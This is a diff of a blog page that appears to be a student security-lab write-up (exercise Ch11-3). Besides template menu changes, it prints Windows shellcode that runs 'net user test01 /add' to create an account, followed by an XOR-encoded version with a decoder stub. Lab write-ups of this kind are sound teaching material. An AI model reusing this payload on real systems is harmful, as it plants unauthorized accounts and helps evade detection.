59&#34;\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe&#34; 60&#34;\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d&#34; 61&#34;\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8&#34; 62&#34;\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16&#34; 63&#34;\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75&#34; 64&#34;\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba&#34; 65&#34;\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba&#34; 66&#34;\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a&#34; 67&#34;\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02&#34; 68&#34;\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a&#34; 69&#34;\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd&#34; 70&#34;\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\\xa4\\xa7\\xa5\\x3d&#34;; 71 72命令成功完成。 73 74 75 76Z:\\toStudentCh11-3&gt; 查看用户 ">
+
+<script src="/js/code-block-enhancer.min.js" defer></script>
     </head>
     <body class="
     article-page
@@ -52,60 +48,47 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
         </span>
     </button>
 
-    <header>
+    <header class="sidebar-header">
         
+        <div class="avatar-section">
             
-            <figure class="site-avatar">
-                <a href="/">
                 
-                    
-                    
+                <figure class="site-avatar">
+                    <a href="/about" class="avatar-link">
                     
                         
-                        <img src="/img/avatar_hu6c25cd778f8db4d2cb962eb2998a0673_130812_300x0_resize_box_3.png" width="300"
-                            height="271" class="site-logo" loading="lazy" alt="Avatar">
+                        
+                        
+                            
+                            <img src="/img/avatar_hu_ef61da91681fc5f7.png" width="300"
+                                height="271" class="site-logo" loading="lazy" alt="Avatar">
+                        
                     
+                    </a>
+                    
+                        <span class="emoji">🍚</span>
+                    
+                </figure>
                 
-                </a>
-                
-                    <span class="emoji">🍚</span>
-                
-            </figure>
             
+        </div>
         
+        <div class="blog-title">
+            <h1 class="site-name"><a href="/">AGA&#39;s Blog</a></h1>
+        </div>
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">AGA&#39;s Blog</a></h1>
             <h2 class="site-description">Hello World!</h2>
         </div>
-    </header><ol class="social-menu">
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        
             
-                <li>
-                    <a 
-                        href='https://github.com/Anonymity-0'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
         
-        
-        
-        <li >
-            <a href='/' >
+        <li  data-menu-item="首页">
+            <a href='/'  class="menu-link">
                 
                 
                 
@@ -119,51 +102,16 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
 
 
                 
-                <span>Home</span>
+                <span>首页</span>
             </a>
         </li>
         
         
-        <li >
-            <a href='/about/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
         
+            
         
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
+        <li  data-menu-item="归档">
+            <a href='/archives/'  class="menu-link">
                 
                 
                 
@@ -177,37 +125,61 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
 
 
                 
-                <span>Archives</span>
+                <span>归档</span>
             </a>
         </li>
         
-
-        <div class="menu-bottom-section">
-                <li id="i18n-switch">  
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M4 5h7" />
-  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
-  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
-  <path d="M12 20l4 -9l4 9" />
-  <path d="M19.1 18h-6.2" />
+        
+        
+            
+        
+        <li  data-menu-item="分类">
+            <a href='/categories/'  class="menu-link">
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
 </svg>
 
 
 
-                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
-                        
-                            <option value="https://anonymity-0.github.io/" selected>English</option>
-                        
-                            <option value="https://anonymity-0.github.io/zh-cn/" >中文</option>
-                        
-                    </select>
-                </li>
+                
+                <span>分类</span>
+            </a>
+        </li>
+        
+        
+        
             
-            
-            
-                <li id="dark-mode-toggle">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        
+        <li  data-menu-item="搜索">
+            <a href='/search/'  class="menu-link">
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <circle cx="8" cy="12" r="2" />
   <rect x="2" y="6" width="20" height="12" rx="6" />
@@ -215,7 +187,7 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
 
 
 
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <circle cx="16" cy="12" r="2" />
   <rect x="2" y="6" width="20" height="12" rx="6" />
@@ -223,10 +195,11 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
 
 
 
-                    <span>Dark Mode</span>
-                </li>
-            
-        </div>
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
     </ol>
 </aside>
 
@@ -339,169 +312,87 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
     
     
     <p>得分10/10</p>
-<h3 id="修改源代码">修改源代码</h3>
-<p>![[IMG_2949.png]]</p>
-<h3 id="shellcode">shellcode</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Z:<span class="se">\t</span>oStudentCh11-3&gt;GetShellcode.exe
-</span></span><span class="line"><span class="cl">/* <span class="nv">292</span><span class="o">=</span>0x124 bytes */
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x33\xc0\x50\x68\x2f\x61\x64\x64\x68\x74\x30\x31\x20\x68\x20\x74&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x65\x73\x68\x75\x73\x65\x72\x68\x65\x78\x65\x20\x68\x6e\x65\x74&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x2e\x68\x70\x61\x64\x2e\x68\x6e\x6f\x74\x65\x8b\xfc\x68\x57\x66&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x0d\xff\x68\x63\x89\xd1\x4f\x68\xc9\xbc\xa6\x6b\x5a\xe8\x56\x00&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x00\x00\x8b\xf0\x5a\xe8\x4e\x00\x00\x00\x8b\xd8\xe8\x05\x00\x00&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x00\xe9\xce\x00\x00\x00\x51\x52\x56\x57\x55\x8b\xec\x8b\xd7\x83&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xec\x54\x8b\xfc\x6a\x14\x59\x33\xc0\x89\x04\x8f\xe2\xfb\xc6\x47&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x10\x44\x8d\x47\x10\x57\x50\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x00\x6a\x00\x52\x6a\x00\xff\xd6\x83\xf8\x00\x74\x03\x50\xff\xd3&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x8b\xe5\x5d\x5f\x5e\x5a\x59\xc3\x56\x53\x51\x52\xe8\x11\x00\x00&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x00\x83\xf8\x00\x7e\x07\x8b\xd8\xe8\x17\x00\x00\x00\x5a\x59\x5b&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x5e\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x1c\x8b\x00&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x8b\x40\x08\xc3\x8b\x43\x3c\x8b\x44\x18\x78\x03\xc3\x8b\xf0\x8b&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x4e\x18\x8b\x46\x20\x03\xc3\x8b\x44\x88\xfc\x03\xc3\x57\x8b\xf8&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xe8\x17\x00\x00\x00\x5f\x3b\xc2\x74\x06\xe2\xe6\x33\xc0\xeb\x0b&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x8b\x46\x1c\x03\xc3\x8b\x44\x88\xfc\x03\xc3\xc3\x53\x51\x52\x57&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x33\xd2\x0f\xbe\x07\x83\xf8\x00\x74\x13\x8b\xda\x8b\xca\xc1\xe3&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x19\xc1\xe9\x07\x0b\xd9\x8b\xd3\x03\xd0\x47\xeb\xe5\x8b\xc2\x5f&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x5a\x59\x5b\xc3&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">XorByte</span><span class="o">=</span>0xfe
-</span></span><span class="line"><span class="cl">/* <span class="nv">292</span><span class="o">=</span>0x124 bytes */
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xcd\x3e\xae\x96\xd1\x9f\x9a\x9a\x96\x8a\xce\xcf\xde\x96\xde\x8a&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b\x86\x9b\xde\x96\x90\x9b\x8a&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xd0\x96\x8e\x9f\x9a\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xa4\xa7\xa5\x3d&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        Success: encode is OK
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">length of <span class="nv">shellcode</span> <span class="o">=</span> <span class="nv">315</span> <span class="o">=</span> 0x13b
-</span></span><span class="line"><span class="cl">/* <span class="nv">315</span><span class="o">=</span>0x13b bytes */
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x24\x01\x80\x34\x0b\xfe\xe2&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfa\xc3\xe8\xeb\xff\xff\xff\xcd\x3e\xae\x96\xd1\x9f\x9a\x9a\x96&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x8a\xce\xcf\xde\x96\xde\x8a\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x86\x9b\xde\x96\x90\x9b\x8a\xd0\x96\x8e\x9f\x9a\xd0\x96\x90\x91&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">命令成功完成。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Z:<span class="se">\t</span>oStudentCh11-3&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="查看用户">查看用户</h3>
-<p><img src="https://cdn.jsdelivr.net/gh/Anonymity-0/Picgo@note_picture/img/IMG_2950.5a07nmrq7p40.webp"
+<h3 id="修改源代码">修改源代码
+</h3><p>![[IMG_2949.png]]</p>
+<h3 id="shellcode">shellcode
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Z:<span class="se">\t</span>oStudentCh11-3&gt;GetShellcode.exe
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">/* <span class="nv">292</span><span class="o">=</span>0x124 bytes */
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">&#34;\x33\xc0\x50\x68\x2f\x61\x64\x64\x68\x74\x30\x31\x20\x68\x20\x74&#34;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">&#34;\x65\x73\x68\x75\x73\x65\x72\x68\x65\x78\x65\x20\x68\x6e\x65\x74&#34;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s2">&#34;\x2e\x68\x70\x61\x64\x2e\x68\x6e\x6f\x74\x65\x8b\xfc\x68\x57\x66&#34;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s2">&#34;\x0d\xff\x68\x63\x89\xd1\x4f\x68\xc9\xbc\xa6\x6b\x5a\xe8\x56\x00&#34;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s2">&#34;\x00\x00\x8b\xf0\x5a\xe8\x4e\x00\x00\x00\x8b\xd8\xe8\x05\x00\x00&#34;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s2">&#34;\x00\xe9\xce\x00\x00\x00\x51\x52\x56\x57\x55\x8b\xec\x8b\xd7\x83&#34;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s2">&#34;\xec\x54\x8b\xfc\x6a\x14\x59\x33\xc0\x89\x04\x8f\xe2\xfb\xc6\x47&#34;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="s2">&#34;\x10\x44\x8d\x47\x10\x57\x50\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a&#34;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="s2">&#34;\x00\x6a\x00\x52\x6a\x00\xff\xd6\x83\xf8\x00\x74\x03\x50\xff\xd3&#34;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="s2">&#34;\x8b\xe5\x5d\x5f\x5e\x5a\x59\xc3\x56\x53\x51\x52\xe8\x11\x00\x00&#34;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s2">&#34;\x00\x83\xf8\x00\x7e\x07\x8b\xd8\xe8\x17\x00\x00\x00\x5a\x59\x5b&#34;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s2">&#34;\x5e\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x1c\x8b\x00&#34;</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s2">&#34;\x8b\x40\x08\xc3\x8b\x43\x3c\x8b\x44\x18\x78\x03\xc3\x8b\xf0\x8b&#34;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s2">&#34;\x4e\x18\x8b\x46\x20\x03\xc3\x8b\x44\x88\xfc\x03\xc3\x57\x8b\xf8&#34;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s2">&#34;\xe8\x17\x00\x00\x00\x5f\x3b\xc2\x74\x06\xe2\xe6\x33\xc0\xeb\x0b&#34;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s2">&#34;\x8b\x46\x1c\x03\xc3\x8b\x44\x88\xfc\x03\xc3\xc3\x53\x51\x52\x57&#34;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="s2">&#34;\x33\xd2\x0f\xbe\x07\x83\xf8\x00\x74\x13\x8b\xda\x8b\xca\xc1\xe3&#34;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="s2">&#34;\x19\xc1\xe9\x07\x0b\xd9\x8b\xd3\x03\xd0\x47\xeb\xe5\x8b\xc2\x5f&#34;</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="s2">&#34;\x5a\x59\x5b\xc3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">XorByte</span><span class="o">=</span>0xfe
+</span></span><span class="line"><span class="ln">25</span><span class="cl">/* <span class="nv">292</span><span class="o">=</span>0x124 bytes */
+</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s2">&#34;\xcd\x3e\xae\x96\xd1\x9f\x9a\x9a\x96\x8a\xce\xcf\xde\x96\xde\x8a&#34;</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="s2">&#34;\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b\x86\x9b\xde\x96\x90\x9b\x8a&#34;</span>
